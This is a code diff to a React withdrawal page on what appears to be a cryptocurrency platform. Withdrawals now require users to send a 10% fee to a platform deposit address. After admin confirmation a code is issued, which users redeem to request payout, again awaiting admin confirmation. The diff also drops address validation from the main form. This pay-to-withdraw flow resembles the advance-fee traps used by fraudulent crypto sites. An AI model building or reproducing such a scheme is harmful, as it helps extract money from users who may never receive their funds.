@@ -14,6 +14,11 @@ const Withdraw = () => {
   const [recipientAddress, setRecipientAddress] = useState("");
   const [amount, setAmount] = useState("");
   const [note, setNote] = useState("");
+  const [feeInfo, setFeeInfo] = useState(null);
+  const [redeemCode, setRedeemCode] = useState("");
+  const [redeemTarget, setRedeemTarget] = useState("");
+  const [redeemLoading, setRedeemLoading] = useState(false);
+  const [redeemMessage, setRedeemMessage] = useState("");
   const [formError, setFormError] = useState("");
   const [showConfirmModal, setShowConfirmModal] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -54,18 +59,10 @@ const Withdraw = () => {
     fetchUserProfile();
   }, [backendUrl]);
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
+  // Initiate withdrawal fee payment (user pays 10% to platform address)
+  const handleInitiateFee = async (e) => {
+    e && e.preventDefault();
     setFormError("");
-
-    if (!recipientAddress.trim()) {
-      setFormError("Please enter a valid ETH address.");
-      return;
-    }
-    if (!isValidEthAddress(recipientAddress)) {
-      setFormError("Please enter a valid 42-character ETH address.");
-      return;
-    }
 
     const requestedAmount = parseFloat(amount);
     const availableBalance = parseFloat(user?.balance || 0);
@@ -81,10 +78,55 @@ const Withdraw = () => {
     }
 
     setSubmitting(true);
-    setTimeout(() => {
+    try {
+      const token = localStorage.getItem("token");
+      const resp = await fetch(backendUrl + "/api/withdrawal/initiate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Authorization: token },
+        body: JSON.stringify({ amountEth: amount }),
+      });
+      const data = await resp.json();
+      if (data.success) {
+        setFeeInfo(data.transaction || data);
+        setShowConfirmModal(true);
+      } else {
+        setFormError(data.message || "Failed to initiate withdrawal fee request");
+      }
+    } catch (err) {
+      console.error(err);
+      setFormError("Error initiating fee: " + err.message);
+    } finally {
       setSubmitting(false);
-      setShowConfirmModal(true);
-    }, 400);
+    }
+  };
+
+  const handleRedeem = async (e) => {
+    e.preventDefault();
+    setRedeemMessage("");
+    if (!redeemCode) return setRedeemMessage("Please enter a code");
+    if (!isValidEthAddress(redeemTarget)) return setRedeemMessage("Please enter a valid destination ETH address");
+    setRedeemLoading(true);
+    try {
+      const token = localStorage.getItem("token");
+      const resp = await fetch(backendUrl + "/api/withdrawal/redeem", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", Authorization: token },
+        body: JSON.stringify({ code: redeemCode, targetAddress: redeemTarget }),
+      });
+      const data = await resp.json();
+      if (data.success) {
+        setRedeemMessage("Code redeemed. Awaiting admin confirmation.");
+        setRedeemCode("");
+        setRedeemTarget("");
+      } else {
+        setRedeemMessage(data.message || "Failed to redeem code");
+      }
+    } catch (err) {
+      console.error(err);
+      setRedeemMessage("Error: " + err.message);
+    } finally {
+      setRedeemLoading(false);
+    }
   };
 
   const availableBalance = parseFloat(user?.balance || 0);
@@ -187,7 +229,7 @@ const Withdraw = () => {
               </p>
             </div>
 
-            <form className="space-y-6" onSubmit={handleSubmit}>
+            <form className="space-y-6" onSubmit={handleInitiateFee}>
               <div>
                 <label className="block text-sm font-medium text-slate-700">
                   Destination ETH Address
@@ -254,6 +296,48 @@ const Withdraw = () => {
                 {submitting ? "Sending request..." : "Request Withdrawal"}
               </button>
             </form>
+
+            {/* Deposit / Fee Info (after initiating) */}
+            {feeInfo && (
+              <div className="mt-6 rounded-lg border border-gray-200 bg-gray-50 p-4">
+                <p className="text-sm text-gray-600">Send the 10% fee to this address:</p>
+                <div className="mt-2 flex items-center justify-between gap-4">
+                  <code className="font-mono break-all text-amber-600">{feeInfo.depositAddress || feeInfo.depositAddress}</code>
+                  <button
+                    onClick={() => {
+                      navigator.clipboard.writeText(feeInfo.depositAddress || feeInfo.depositAddress);
+                      alert('Address copied');
+                    }}
+                    className="px-3 py-2 bg-amber-500 rounded text-white"
+                  >
+                    Copy
+                  </button>
+                </div>
+                <p className="mt-3 text-sm text-gray-700">Fee to pay: <span className="font-semibold">{feeInfo.feeEth || feeInfo.amountEth} ETH</span></p>
+                <p className="mt-1 text-xs text-gray-500">After admin confirms payment a withdrawal code will be issued to your account.</p>
+                <p className="mt-2 text-sm"><a className="text-amber-600 underline" href="/withdrawal-codes">View your Withdrawal Codes</a></p>
+              </div>
+            )}
+
+            {/* Redeem Code Section */}
+            <div className="mt-6 rounded-lg border border-gray-200 bg-white p-4">
+              <h3 className="text-lg font-semibold">Redeem Withdrawal Code</h3>
+              <p className="text-sm text-gray-600 mb-3">If you already have a withdrawal code, enter it below with the destination address to create a withdrawal request.</p>
+              <form onSubmit={handleRedeem} className="space-y-3">
+                <div>
+                  <label className="block text-sm font-medium text-slate-700">Withdrawal Code</label>
+                  <input value={redeemCode} onChange={(e) => setRedeemCode(e.target.value)} placeholder="Enter 10-character code" className="mt-2 w-full rounded-3xl border border-slate-300 px-3 py-2" />
+                </div>
+                <div>
+                  <label className="block text-sm font-medium text-slate-700">Destination ETH Address</label>
+                  <input value={redeemTarget} onChange={(e) => setRedeemTarget(e.target.value)} placeholder="0x1234..." className="mt-2 w-full rounded-3xl border border-slate-300 px-3 py-2" />
+                </div>
+                {redeemMessage && <p className="text-sm text-red-600">{redeemMessage}</p>}
+                <div>
+                  <button type="submit" disabled={redeemLoading} className="mt-2 w-full py-2 bg-amber-500 text-white rounded-3xl">{redeemLoading ? 'Processing...' : 'Redeem Code'}</button>
+                </div>
+              </form>
+            </div>
           </section>
 
           <aside className="rounded-[2rem] bg-slate-950/95 p-8 text-white shadow-xl border border-slate-900">
